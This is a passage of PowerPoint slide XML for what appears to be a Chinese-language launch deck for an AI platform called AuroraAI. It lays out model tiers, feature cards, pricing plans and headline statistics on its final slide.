            <a:ext cx="53947" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A3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513558" y="2251159"/>
            <a:ext cx="53947" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A3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639434" y="2251159"/>
            <a:ext cx="53947" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A3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657416" y="2170239"/>
            <a:ext cx="1222796" cy="197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3A2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正在生成可视化图表...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Shape 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="2421991"/>
            <a:ext cx="4972106" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1410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028035" y="2475938"/>
            <a:ext cx="539469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488" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A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切换模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Shape 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4603469" y="2457956"/>
            <a:ext cx="683327" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 63563"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C0A44"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="5A28C8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603469" y="2457956"/>
            <a:ext cx="683327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Aurora-Ultra</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Shape 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5322761" y="2457956"/>
            <a:ext cx="683327" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 63563"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="08060F"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1A143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322761" y="2457956"/>
            <a:ext cx="683327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Aurora-Pro</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Shape 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6042053" y="2457956"/>
            <a:ext cx="683327" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 63563"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="08060F"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1A143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042053" y="2457956"/>
            <a:ext cx="683327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Aurora-Mini</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Shape 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6761345" y="2457956"/>
            <a:ext cx="683327" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 63563"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="08060F"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1A143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761345" y="2457956"/>
            <a:ext cx="683327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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A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Code-Spec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Shape 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4028035" y="2655761"/>
            <a:ext cx="4756319" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 40680"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0816"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1A143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099965" y="2655761"/>
            <a:ext cx="4396673" cy="1798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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A1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Aurora 发送消息...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Shape 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8604531" y="2673743"/>
            <a:ext cx="179823" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50850"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A20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604531" y="2673743"/>
            <a:ext cx="179823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600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Shape 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="2943478"/>
            <a:ext cx="2450088" cy="503504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9080"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C0A18"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="14102A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010053" y="3015407"/>
            <a:ext cx="215788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4010053" y="3177248"/>
            <a:ext cx="2306230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3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多模态理解</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Text 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4010053" y="3285142"/>
            <a:ext cx="2306230" cy="143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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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图文视频音频全模态输入，深度语义理解，支持 100+ 文件格式</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Shape 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6442159" y="2943478"/>
            <a:ext cx="2450088" cy="503504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9080"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C0A18"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="14102A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532071" y="3015407"/>
            <a:ext cx="215788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📚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6532071" y="3177248"/>
            <a:ext cx="2306230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3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企业知识库 RAG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Text 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6532071" y="3285142"/>
            <a:ext cx="2306230" cy="143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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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向量检索+知识图谱，100ms 召回，文档秒级更新</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Shape 113"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="3518912"/>
            <a:ext cx="2450088" cy="503504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9080"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C0A18"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="14102A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010053" y="3590841"/>
            <a:ext cx="215788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4010053" y="3752681"/>
            <a:ext cx="2306230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3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工作流</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Text 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4010053" y="3860575"/>
            <a:ext cx="2306230" cy="143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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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可视化编排 Agent，自动规划+工具调用，无代码配置</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Shape 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6442159" y="3518912"/>
            <a:ext cx="2450088" cy="503504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9080"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A1A5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532071" y="3590841"/>
            <a:ext cx="215788" cy="161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532071" y="3752681"/>
            <a:ext cx="2306230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3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私有化部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6532071" y="3860575"/>
            <a:ext cx="2306230" cy="143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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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数据不出域，本地 GPU 推理，满足等保三级合规要求</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Shape 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="4112327"/>
            <a:ext cx="1609416" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0816"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1A143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010053" y="4184257"/>
            <a:ext cx="1429593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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7A6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免费版</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Text 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4010053" y="4310133"/>
            <a:ext cx="1249770" cy="197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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Text 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4153912" y="4364080"/>
            <a:ext cx="269735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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Text 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4010053" y="4543903"/>
            <a:ext cx="1465558" cy="16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450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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100万 token/月 · 3个知识库</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Shape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5601487" y="4112327"/>
            <a:ext cx="1609416" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="140630"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A187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707398" y="4040398"/>
            <a:ext cx="485522" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 72643"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A28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707398" y="4040398"/>
            <a:ext cx="485522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🔥</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Text 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5691398" y="4184257"/>
            <a:ext cx="1429593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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C4B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专业版</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Text 130"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5691398" y="4310133"/>
            <a:ext cx="1249770" cy="197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¥299</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Text 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5979115" y="4364080"/>
            <a:ext cx="269735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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Text 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5691398" y="4543903"/>
            <a:ext cx="1465558" cy="16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450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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无限 token · 私有知识库 · API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Shape 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7282832" y="4112327"/>
            <a:ext cx="1609416" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0816"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1A143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7372743" y="4184257"/>
            <a:ext cx="1429593" cy="1078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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7A6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企业版</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Text 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7372743" y="4310133"/>
            <a:ext cx="1249770" cy="197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定制</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Text 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7372743" y="4543903"/>
            <a:ext cx="1465558" cy="16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450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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 · SLA 99.9% · 专属支持</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Shape 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0806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0" y="6054416"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1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798230" y="6054416"/>
            <a:ext cx="5394690" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A1A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636389" y="6126345"/>
            <a:ext cx="8991" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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326726" y="6126345"/>
            <a:ext cx="8991" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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963115" y="6126345"/>
            <a:ext cx="8991" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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527575" y="6126345"/>
            <a:ext cx="8991" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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143858" y="6090381"/>
            <a:ext cx="215788" cy="323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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Text 145"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="377628" y="6090381"/>
            <a:ext cx="1348673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488" kern="0" spc="50" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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响应速度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Text 146"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="377628" y="6198274"/>
            <a:ext cx="1348673" cy="1798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200ms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149" name="Text 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6090381"/>
            <a:ext cx="215788" cy="323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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150" name="Text 148"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2032000" y="6090381"/>
            <a:ext cx="1348673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488" kern="0" spc="50" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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上下文窗口</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Text 149"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2032000" y="6198274"/>
            <a:ext cx="1348673" cy="1798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 token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Text 150"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3488566" y="6090381"/>
            <a:ext cx="215788" cy="323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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Text 151"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3722336" y="6090381"/>
            <a:ext cx="1348673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488" kern="0" spc="50" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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本月新增用户</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Text 152"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3722336" y="6198274"/>
            <a:ext cx="1348673" cy="1798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+28,400</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Text 153"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5106973" y="6090381"/>
            <a:ext cx="215788" cy="323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🌍</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Text 154"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5340743" y="6090381"/>
            <a:ext cx="1348673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488" kern="0" spc="50" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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支持语言</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Text 155"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5340743" y="6198274"/>
            <a:ext cx="1348673" cy="1798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56种</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Text 156"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6653451" y="6090381"/>
            <a:ext cx="215788" cy="323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900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Text 157"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6887221" y="6090381"/>
            <a:ext cx="1348673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488" kern="0" spc="50" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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集成工具</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Text 158"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6887221" y="6198274"/>
            <a:ext cx="1348673" cy="1798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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Shape 159"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7840283" y="6198274"/>
            <a:ext cx="53947" cy="53947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7930195" y="6162310"/>
            <a:ext cx="1078938" cy="1438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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2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Systems Operational</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Shape 161"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0403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0" y="6485991"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="100C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287717" y="6512965"/>
            <a:ext cx="5844248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488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AuroraAI · Next-gen Intelligence Platform · © 2026 · Privacy Policy · Terms of Service</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Text 164"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6293805" y="6512965"/>
            <a:ext cx="2697345" cy="125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488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06 / 06 · AI PRODUCT LAUNCH · 2026-03-13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="48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1495</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>全屏显示(4:3)</PresentationFormat>
  <Paragraphs>624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等线</vt:lpstr>
      <vt:lpstr>Microsoft YaHei</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Segoe UI Emoji</vt:lpstr>
      <vt:lpstr>Segoe UI Symbol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lenovo</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-13T08:59:29Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-13T09:30:59Z</dcterms:modified>
</cp:coreProperties>
</file>